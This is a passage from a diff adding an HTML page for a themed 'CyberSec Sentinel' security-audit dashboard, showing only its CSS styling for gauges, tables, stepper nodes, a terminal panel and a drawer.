@@ -1,0 +1,3002 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CyberSec Sentinel — Interactive Security Audit & Vulnerability Scanner</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      /* Base Cyber Dark Palette */
+      --bg-dark: #030812;
+      --bg-card: #060d1b;
+      --bg-card-hover: #0c172e;
+      --bg-surface: #101c38;
+      --bg-panel: #091224;
+
+      /* Cyber Alert Red */
+      --red-alert: #ef4444;
+      --red-intense: #dc2626;
+      --red-glow: rgba(239, 68, 68, 0.5);
+      --red-subtle: rgba(239, 68, 68, 0.12);
+
+      /* Neon Emerald */
+      --green-neon: #10b981;
+      --green-bright: #34d399;
+      --green-glow: rgba(16, 185, 129, 0.5);
+      --green-subtle: rgba(16, 185, 129, 0.12);
+
+      /* Accents & Status Colors */
+      --cyan-cyber: #00e5ff;
+      --cyan-glow: rgba(0, 229, 255, 0.45);
+      --amber-warn: #f59e0b;
+      --amber-glow: rgba(245, 158, 11, 0.45);
+      --orange-risk: #f97316;
+      --purple-accent: #a855f7;
+
+      /* Text & Borders */
+      --text-primary: #e2e8f0;
+      --text-secondary: #94a3b8;
+      --text-muted: #64748b;
+      --border-subtle: rgba(226, 232, 240, 0.08);
+      --border-bright: rgba(0, 229, 255, 0.25);
+
+      /* Typography */
+      --font-ui: 'Inter', system-ui, -apple-system, sans-serif;
+      --font-mono: 'JetBrains Mono', 'Cascadia Code', 'Fira Code', monospace;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-dark);
+      color: var(--text-primary);
+      font-family: var(--font-ui);
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+      line-height: 1.5;
+    }
+
+    /* Ambient Hexagonal & Cyberpunk Grid Background */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(30deg, rgba(239, 68, 68, 0.02) 12%, transparent 12.5%, transparent 87%, rgba(239, 68, 68, 0.02) 87.5%),
+        linear-gradient(150deg, rgba(239, 68, 68, 0.02) 12%, transparent 12.5%, transparent 87%, rgba(239, 68, 68, 0.02) 87.5%),
+        linear-gradient(30deg, rgba(16, 185, 129, 0.015) 12%, transparent 12.5%, transparent 87%, rgba(16, 185, 129, 0.015) 87.5%),
+        linear-gradient(150deg, rgba(16, 185, 129, 0.015) 12%, transparent 12.5%, transparent 87%, rgba(16, 185, 129, 0.015) 87.5%),
+        linear-gradient(60deg, rgba(0, 229, 255, 0.015) 25%, transparent 25.5%, transparent 75%, rgba(0, 229, 255, 0.015) 75%);
+      background-size: 44px 76px;
+      background-position: 0 0, 0 0, 22px 38px, 22px 38px, 0 0;
+      pointer-events: none;
+      z-index: 0;
+      opacity: 0.7;
+    }
+
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(ellipse 70% 50% at 50% 15%, rgba(239, 68, 68, 0.04) 0%, rgba(0, 229, 255, 0.02) 45%, transparent 80%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: var(--bg-dark);
+    }
+    ::-webkit-scrollbar-thumb {
+      background: var(--bg-surface);
+      border-radius: 3px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: var(--cyan-cyber);
+    }
+
+    /* Layout Container */
+    .app-container {
+      position: relative;
+      z-index: 1;
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 24px 20px 60px;
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+
+    /* Header */
+    .app-header {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 20px 24px;
+      background: linear-gradient(135deg, rgba(6, 13, 27, 0.95), rgba(16, 28, 56, 0.85));
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+    }
+
+    .brand-section {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      flex-wrap: wrap;
+      max-width: 100%;
+    }
+
+    .brand-logo {
+      width: 44px;
+      height: 44px;
+      border-radius: 10px;
+      background: radial-gradient(circle, rgba(239, 68, 68, 0.25), rgba(6, 13, 27, 0.9));
+      border: 1px solid var(--red-alert);
+      box-shadow: 0 0 16px var(--red-glow);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+    }
+
+    .brand-titles h1 {
+      font-size: clamp(1.05rem, 2.5vw, 1.4rem);
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    .brand-titles h1 .badge-v {
+      font-size: clamp(0.6rem, 1.2vw, 0.7rem);
+      font-family: var(--font-mono);
+      padding: 2px 6px;
+      border-radius: 4px;
+      background: rgba(0, 229, 255, 0.12);
+      color: var(--cyan-cyber);
+      border: 1px solid rgba(0, 229, 255, 0.3);
+      font-weight: 600;
+      letter-spacing: 0.05em;
+    }
+
+    .brand-titles p {
+      font-size: clamp(0.72rem, 1.4vw, 0.85rem);
+      color: var(--text-secondary);
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    .target-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(3, 8, 18, 0.8);
+      padding: 4px 10px;
+      border-radius: 6px;
+      border: 1px solid var(--border-subtle);
+      font-family: var(--font-mono);
+      font-size: clamp(0.68rem, 1.3vw, 0.78rem);
+      color: var(--cyan-cyber);
+    }
+
+    .target-pill .pulse-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--red-alert);
+      box-shadow: 0 0 8px var(--red-alert);
+      animation: pulseDot 1.5s infinite ease-in-out;
+    }
+
+    @keyframes pulseDot {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.3); opacity: 0.5; }
+    }
+
+    /* Actions Bar */
+    .header-actions {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 9px 16px;
+      border-radius: 8px;
+      font-family: var(--font-ui);
+      font-size: clamp(0.75rem, 1.5vw, 0.85rem);
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+      border: 1px solid transparent;
+      outline: none;
+      user-select: none;
+      white-space: nowrap;
+    }
+
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #ef4444, #dc2626);
+      color: #fff;
+      border-color: rgba(255, 255, 255, 0.2);
+      box-shadow: 0 0 16px rgba(239, 68, 68, 0.35);
+    }
+
+    .btn-primary:hover:not(:disabled) {
+      background: linear-gradient(135deg, #f87171, #ef4444);
+      box-shadow: 0 0 24px rgba(239, 68, 68, 0.6);
+      transform: translateY(-1px);
+    }
+
+    .btn-secondary {
+      background: rgba(16, 28, 56, 0.8);
+      color: var(--text-secondary);
+      border-color: var(--border-subtle);
+    }
+
+    .btn-secondary:hover:not(:disabled) {
+      background: rgba(24, 40, 78, 0.9);
+      color: #fff;
+      border-color: var(--cyan-cyber);
+    }
+
+    .btn-outline {
+      background: transparent;
+      color: var(--cyan-cyber);
+      border-color: rgba(0, 229, 255, 0.3);
+    }
+
+    .btn-outline:hover:not(:disabled) {
+      background: rgba(0, 229, 255, 0.1);
+      border-color: var(--cyan-cyber);
+      box-shadow: 0 0 12px rgba(0, 229, 255, 0.2);
+    }
+
+    .btn-amber {
+      background: rgba(245, 158, 11, 0.15);
+      color: var(--amber-warn);
+      border-color: rgba(245, 158, 11, 0.4);
+    }
+
+    .btn-amber:hover:not(:disabled) {
+      background: rgba(245, 158, 11, 0.25);
+      box-shadow: 0 0 12px rgba(245, 158, 11, 0.3);
+    }
+
+    .btn-success {
+      background: rgba(16, 185, 129, 0.15);
+      color: var(--green-neon);
+      border-color: rgba(16, 185, 129, 0.4);
+    }
+
+    .btn-success:hover:not(:disabled) {
+      background: rgba(16, 185, 129, 0.25);
+      box-shadow: 0 0 12px rgba(16, 185, 129, 0.3);
+    }
+
+    /* Stepper Section */
+    .stepper-section {
+      background: var(--bg-card);
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      padding: 24px;
+      margin-bottom: 24px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+    }
+
+    .stepper-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+
+    .section-title {
+      font-size: clamp(0.82rem, 1.8vw, 0.98rem);
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      color: var(--text-secondary);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .section-title span.glow-icon {
+      color: var(--cyan-cyber);
+      text-shadow: 0 0 10px var(--cyan-cyber);
+    }
+
+    .stepper-status-badge {
+      font-family: var(--font-mono);
+      font-size: clamp(0.68rem, 1.3vw, 0.78rem);
+      padding: 4px 10px;
+      border-radius: 20px;
+      background: rgba(16, 28, 56, 0.8);
+      border: 1px solid var(--border-subtle);
+      color: var(--text-secondary);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    /* Stepper Flow Layout */
+    .stepper-container {
+      position: relative;
+      display: grid;
+      grid-template-columns: repeat(7, 1fr);
+      gap: 12px;
+      padding: 10px 0 6px;
+    }
+
+    /* Progress Connection Track behind nodes */
+    .stepper-track-bg {
+      position: absolute;
+      top: calc(clamp(48px, 10vw, 60px) / 2 + 10px);
+      left: 5%;
+      right: 5%;
+      height: 3px;
+      background: rgba(255, 255, 255, 0.06);
+      z-index: 1;
+    }
+
+    .stepper-track-fill {
+      position: absolute;
+      top: calc(clamp(48px, 10vw, 60px) / 2 + 10px);
+      left: 5%;
+      height: 3px;
+      width: 0%;
+      background: linear-gradient(90deg, var(--red-alert), var(--amber-warn), var(--green-neon));
+      box-shadow: 0 0 10px var(--cyan-glow);
+      z-index: 1;
+      transition: width 0.4s ease-out;
+    }
+
+    /* Stepper Node Item */
+    .stepper-node {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      cursor: pointer;
+      transition: transform 0.2s ease, opacity 0.2s ease;
+      user-select: none;
+    }
+
+    .stepper-node:hover {
+      transform: translateY(-3px);
+    }
+
+    .stepper-node:hover .node-circle {
+      border-color: var(--cyan-cyber);
+      box-shadow: 0 0 20px var(--cyan-glow);
+    }
+
+    /* Node Circle & Glowing Emojis */
+    .node-circle-wrap {
+      position: relative;
+      width: clamp(48px, 10vw, 60px);
+      height: clamp(48px, 10vw, 60px);
+      margin-bottom: 10px;
+    }
+
+    .node-circle {
+      width: clamp(48px, 10vw, 60px);
+      height: clamp(48px, 10vw, 60px);
+      border-radius: 50%;
+      background: var(--bg-card);
+      border: 2px solid rgba(226, 232, 240, 0.15);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: clamp(18px, 3.5vw, 24px);
+      position: relative;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+    }
+
+    /* Persistent Glowing Emoji Icon */
+    .node-emoji {
+      display: inline-block;
+      transition: all 0.3s ease;
+      filter: saturate(0.8) brightness(0.9);
+      user-select: none;
+    }
+
+    /* Rotating Active Spinner Ring */
+    .node-spin-ring {
+      position: absolute;
+      inset: -6px;
+      border-radius: 50%;
+      border: 2px dashed transparent;
+      border-top-color: var(--cyan-cyber);
+      border-bottom-color: var(--cyan-cyber);
+      opacity: 0;
+      pointer-events: none;
+      animation: spinRing 1.2s linear infinite;
+    }
+
+    @keyframes spinRing {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Node Lifecycle States */
+    .stepper-node.state-pending .node-circle {
+      border-color: rgba(226, 232, 240, 0.12);
+      background: #040914;
+    }
+    .stepper-node.state-pending .node-emoji {
+      filter: saturate(0.4) brightness(0.5);
+    }
+
+    .stepper-node.state-active .node-circle {
+      border-color: var(--cyan-cyber);
+      background: radial-gradient(circle, rgba(0, 229, 255, 0.18), #060d1b 75%);
+      box-shadow: 0 0 24px var(--cyan-glow);
+    }
+    .stepper-node.state-active .node-spin-ring {
+      opacity: 1;
+    }
+    .stepper-node.state-active .node-emoji {
+      filter: saturate(1.2) brightness(1.2) drop-shadow(0 0 10px var(--cyan-cyber));
+      animation: bounceIcon 1.5s ease-in-out infinite;
+    }
+
+    @keyframes bounceIcon {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-4px); }
+    }
+
+    .stepper-node.state-critical .node-circle {
+      border-color: var(--red-alert);
+      background: radial-gradient(circle, rgba(239, 68, 68, 0.2), #060d1b 75%);
+      box-shadow: 0 0 20px var(--red-glow);
+    }
+    .stepper-node.state-critical .node-emoji {
+      filter: saturate(1.3) drop-shadow(0 0 12px var(--red-alert));
+      animation: criticalPulse 2s ease-in-out infinite;
+    }
+
+    @keyframes criticalPulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.08); }
+    }
+
+    .stepper-node.state-warning .node-circle {
+      border-color: var(--amber-warn);
+      background: radial-gradient(circle, rgba(245, 158, 11, 0.2), #060d1b 75%);
+      box-shadow: 0 0 20px var(--amber-glow);
+    }
+    .stepper-node.state-warning .node-emoji {
+      filter: saturate(1.2) drop-shadow(0 0 10px var(--amber-warn));
+    }
+
+    .stepper-node.state-passed .node-circle,
+    .stepper-node.state-patched .node-circle {
+      border-color: var(--green-neon);
+      background: radial-gradient(circle, rgba(16, 185, 129, 0.22), #060d1b 75%);
+      box-shadow: 0 0 22px var(--green-glow);
+    }
+    .stepper-node.state-passed .node-emoji,
+    .stepper-node.state-patched .node-emoji {
+      filter: saturate(1.3) drop-shadow(0 0 12px var(--green-neon));
+    }
+
+    /* Node Text & Pill Labels */
+    .node-title {
+      font-size: 0.78rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 4px;
+      line-height: 1.2;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+      min-height: 28px;
+    }
+
+    .node-tag {
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      padding: 2px 7px;
+      border-radius: 4px;
+      background: rgba(16, 28, 56, 0.8);
+      border: 1px solid var(--border-subtle);
+      color: var(--text-muted);
+      font-weight: 600;
+      letter-spacing: 0.03em;
+      transition: all 0.3s ease;
+    }
+
+    .stepper-node.state-pending .node-tag { color: var(--text-muted); }
+    .stepper-node.state-active .node-tag { color: var(--cyan-cyber); border-color: rgba(0, 229, 255, 0.4); background: rgba(0, 229, 255, 0.1); }
+    .stepper-node.state-critical .node-tag { color: var(--red-alert); border-color: rgba(239, 68, 68, 0.4); background: rgba(239, 68, 68, 0.1); }
+    .stepper-node.state-warning .node-tag { color: var(--amber-warn); border-color: rgba(245, 158, 11, 0.4); background: rgba(245, 158, 11, 0.1); }
+    .stepper-node.state-passed .node-tag,
+    .stepper-node.state-patched .node-tag { color: var(--green-neon); border-color: rgba(16, 185, 129, 0.4); background: rgba(16, 185, 129, 0.1); }
+
+    /* Hero Dashboard Section: Score Gauge + Live Metric Cards */
+    .hero-grid {
+      display: grid;
+      grid-template-columns: 340px 1fr;
+      gap: 20px;
+    }
+
+    /* Circular SVG Gauge Card */
+    .gauge-card {
+      background: linear-gradient(135deg, rgba(6, 13, 27, 0.95), rgba(16, 28, 56, 0.85));
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      padding: 24px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+    }
+
+    .gauge-title {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .svg-gauge-wrap {
+      position: relative;
+      width: 170px;
+      height: 170px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .svg-gauge {
+      width: 100%;
+      height: 100%;
+      transform: rotate(-90deg);
+    }
+
+    .gauge-track {
+      fill: none;
+      stroke: rgba(255, 255, 255, 0.06);
+      stroke-width: 10;
+    }
+
+    .gauge-progress {
+      fill: none;
+      stroke: var(--red-alert);
+      stroke-width: 10;
+      stroke-linecap: round;
+      stroke-dasharray: 351.858;
+      stroke-dashoffset: 351.858;
+      transition: stroke 0.4s ease;
+      filter: drop-shadow(0 0 8px rgba(239, 68, 68, 0.6));
+    }
+
+    .gauge-center-content {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      pointer-events: none;
+    }
+
+    .gauge-score-value {
+      font-family: var(--font-mono);
+      font-size: clamp(1.8rem, 4.5vw, 2.6rem);
+      font-weight: 800;
+      color: #fff;
+      line-height: 1;
+    }
+
+    .gauge-grade-badge {
+      margin-top: 4px;
+      font-size: 0.8rem;
+      font-weight: 800;
+      font-family: var(--font-mono);
+      padding: 2px 10px;
+      border-radius: 12px;
+      background: rgba(239, 68, 68, 0.15);
+      border: 1px solid rgba(239, 68, 68, 0.4);
+      color: var(--red-alert);
+      letter-spacing: 0.05em;
+    }
+
+    .gauge-posture-label {
+      margin-top: 14px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--text-secondary);
+      font-family: var(--font-mono);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    /* Metric Cards Grid */
+    .metric-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      grid-template-rows: repeat(2, 1fr);
+      gap: 16px;
+    }
+
+    .metric-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
+      transition: all 0.2s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .metric-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 4px;
+      height: 100%;
+      background: var(--border-subtle);
+      transition: background 0.3s ease;
+    }
+
+    .metric-card.accent-red::before { background: var(--red-alert); box-shadow: 0 0 10px var(--red-alert); }
+    .metric-card.accent-green::before { background: var(--green-neon); box-shadow: 0 0 10px var(--green-neon); }
+    .metric-card.accent-amber::before { background: var(--amber-warn); box-shadow: 0 0 10px var(--amber-warn); }
+    .metric-card.accent-cyan::before { background: var(--cyan-cyber); box-shadow: 0 0 10px var(--cyan-cyber); }
+
+    .metric-card:hover {
+      border-color: rgba(226, 232, 240, 0.15);
+      transform: translateY(-2px);
+    }
+
+    .metric-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .metric-label {
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .metric-icon-wrap {
+      font-size: 1.2rem;
+    }
+
+    .metric-value {
+      font-family: var(--font-mono);
+      font-size: clamp(1.3rem, 3.5vw, 1.9rem);
+      font-weight: 700;
+      color: #fff;
+      margin: 8px 0 2px;
+    }
+
+    .metric-subtext {
+      font-size: 0.72rem;
+      color: var(--text-muted);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    /* Vulnerability Matrix Section */
+    .matrix-panel {
+      background: var(--bg-card);
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      padding: 24px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+    }
+
+    .matrix-toolbar {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+
+    /* Filter Pills */
+    .filter-pills {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    .filter-pill {
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 0.78rem;
+      font-weight: 600;
+      cursor: pointer;
+      background: rgba(16, 28, 56, 0.6);
+      border: 1px solid var(--border-subtle);
+      color: var(--text-secondary);
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      user-select: none;
+    }
+
+    .filter-pill:hover {
+      background: rgba(22, 38, 76, 0.9);
+      color: #fff;
+    }
+
+    .filter-pill.active {
+      background: var(--cyan-cyber);
+      color: #030812;
+      border-color: var(--cyan-cyber);
+      font-weight: 700;
+      box-shadow: 0 0 12px var(--cyan-glow);
+    }
+
+    .filter-pill .pill-count {
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      padding: 1px 6px;
+      border-radius: 10px;
+      background: rgba(0, 0, 0, 0.3);
+      color: inherit;
+    }
+
+    .filter-pill.active .pill-count {
+      background: rgba(0, 0, 0, 0.2);
+    }
+
+    /* Search & Batch Actions */
+    .matrix-search-wrap {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      min-width: 0;
+      width: min(100%, 320px);
+    }
+
+    .search-box {
+      position: relative;
+      flex: 1;
+    }
+
+    .search-box input {
+      width: 100%;
+      background: rgba(3, 8, 18, 0.8);
+      border: 1px solid var(--border-subtle);
+      border-radius: 8px;
+      padding: 8px 12px 8px 34px;
+      font-family: var(--font-ui);
+      font-size: 0.8rem;
+      color: #fff;
+      outline: none;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .search-box input:focus {
+      border-color: var(--cyan-cyber);
+      box-shadow: 0 0 10px var(--cyan-glow);
+    }
+
+    .search-box .search-icon {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--text-muted);
+      font-size: 0.85rem;
+      pointer-events: none;
+    }
+
+    /* Table Styling */
+    .table-container {
+      width: 100%;
+      overflow-x: auto;
+      border-radius: 8px;
+      border: 1px solid var(--border-subtle);
+    }
+
+    .vuln-table {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+      font-size: 0.82rem;
+    }
+
+    .vuln-table th {
+      background: rgba(16, 28, 56, 0.9);
+      padding: 12px 16px;
+      font-weight: 700;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      border-bottom: 1px solid var(--border-subtle);
+      white-space: nowrap;
+    }
+
+    .vuln-table td {
+      padding: 14px 16px;
+      border-bottom: 1px solid rgba(226, 232, 240, 0.04);
+      background: rgba(6, 13, 27, 0.6);
+      transition: background 0.2s ease;
+      vertical-align: middle;
+    }
+
+    .vuln-table tr:hover td {
+      background: rgba(16, 28, 56, 0.7);
+    }
+
+    .vuln-table tr.row-patched td {
+      background: rgba(16, 185, 129, 0.04);
+    }
+
+    .vuln-table tr.row-flash td {
+      animation: rowGlow 1.2s ease-out;
+    }
+
+    @keyframes rowGlow {
+      0% { background: rgba(16, 185, 129, 0.35); }
+      100% { background: rgba(16, 185, 129, 0.04); }
+    }
+
+    /* Severity Badges */
+    .severity-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.03em;
+    }
+
+    .badge-critical {
+      background: rgba(239, 68, 68, 0.15);
+      border: 1px solid rgba(239, 68, 68, 0.4);
+      color: var(--red-alert);
+    }
+
+    .badge-high {
+      background: rgba(249, 115, 22, 0.15);
+      border: 1px solid rgba(249, 115, 22, 0.4);
+      color: var(--orange-risk);
+    }
+
+    .badge-medium {
+      background: rgba(245, 158, 11, 0.15);
+      border: 1px solid rgba(245, 158, 11, 0.4);
+      color: var(--amber-warn);
+    }
+
+    .badge-low {
+      background: rgba(0, 229, 255, 0.15);
+      border: 1px solid rgba(0, 229, 255, 0.4);
+      color: var(--cyan-cyber);
+    }
+
+    .badge-passed {
+      background: rgba(16, 185, 129, 0.15);
+      border: 1px solid rgba(16, 185, 129, 0.4);
+      color: var(--green-neon);
+    }
+
+    .vuln-name-cell {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .vuln-title {
+      font-weight: 600;
+      color: #fff;
+    }
+
+    .vuln-meta {
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      color: var(--text-muted);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .vuln-meta .cve-tag {
+      color: var(--cyan-cyber);
+    }
+
+    .cvss-score {
+      font-family: var(--font-mono);
+      font-weight: 700;
+      font-size: 0.85rem;
+    }
+
+    .status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      font-weight: 600;
+      padding: 3px 8px;
+      border-radius: 4px;
+    }
+
+    .status-vulnerable {
+      background: rgba(239, 68, 68, 0.12);
+      color: var(--red-alert);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+    }
+
+    .status-patched {
+      background: rgba(16, 185, 129, 0.15);
+      color: var(--green-neon);
+      border: 1px solid rgba(16, 185, 129, 0.35);
+      box-shadow: 0 0 10px rgba(16, 185, 129, 0.2);
+    }
+
+    .table-actions {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    /* Live Terminal Console */
+    .terminal-panel {
+      background: var(--bg-card);
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+    }
+
+    .terminal-header {
+      background: rgba(16, 28, 56, 0.95);
+      padding: 12px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--border-subtle);
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .terminal-title {
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      font-weight: 700;
+      color: var(--text-secondary);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .terminal-controls {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .terminal-body {
+      background: #02060f;
+      padding: 16px 20px;
+      font-family: var(--font-mono);
+      font-size: 0.76rem;
+      min-height: 140px;
+      max-height: 240px;
+      height: auto;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      line-height: 1.45;
+      transition: height 0.3s ease;
+    }
+
+    .terminal-body.collapsed {
+      min-height: 0;
+      height: 0;
+      padding: 0 20px;
+      overflow: hidden;
+    }
+
+    .log-line {
+      display: flex;
+      gap: 10px;
+      word-break: break-all;
+    }
+
+    .log-time {
+      color: var(--text-muted);
+      flex-shrink: 0;
+    }
+
+    .log-source {
+      color: var(--cyan-cyber);
+      font-weight: 600;
+      flex-shrink: 0;
+    }
+
+    .log-msg-info { color: #cbd5e1; }
+    .log-msg-warn { color: var(--amber-warn); }
+    .log-msg-crit { color: var(--red-alert); font-weight: 600; }
+    .log-msg-pass { color: var(--green-neon); font-weight: 600; }
+    .log-msg-patch { color: #34d399; text-shadow: 0 0 6px rgba(16, 185, 129, 0.4); }
+
+    /* Slide-Over Telemetry Inspection Drawer */
+    .drawer-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(3, 8, 18, 0.7);
+      backdrop-filter: blur(8px);
+      z-index: 99;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+
+    .drawer-overlay.open {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .inspection-drawer {
+      position: fixed;
+      top: 0;
+      right: 0;
+      bottom: 0;
+      width: 640px;
+      max-width: 95vw;
+      background: var(--bg-panel);
+      border-left: 1px solid var(--border-bright);
+      box-shadow: -10px 0 40px rgba(0, 0, 0, 0.6);
+      z-index: 100;
+      transform: translateX(100%);
+      transition: transform 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .inspection-drawer.open {
+      transform: translateX(0);
+    }
+
+    .drawer-header {
+      padding: 20px 24px;
+      background: rgba(16, 28, 56, 0.9);
+      border-bottom: 1px solid var(--border-subtle);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 14px;
+    }
+
+    .drawer-node-info {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .drawer-emoji-badge {
+      width: 44px;
+      height: 44px;
+      border-radius: 10px;
+      background: rgba(6, 13, 27, 0.8);
+      border: 1px solid var(--border-subtle);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+    }
+
+    .drawer-titles h3 {
+      font-size: clamp(0.95rem, 2vw, 1.2rem);
+      font-weight: 700;
+      color: #fff;
+    }
+
+    .drawer-titles p {
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      font-family: var(--font-mono);
+    }
+
+    .drawer-close-btn {
+      background: transparent;
+      border: 1px solid var(--border-subtle);
+      color: var(--text-secondary);
+      width: 34px;
+      height: 34px;
+      border-radius: 8px;
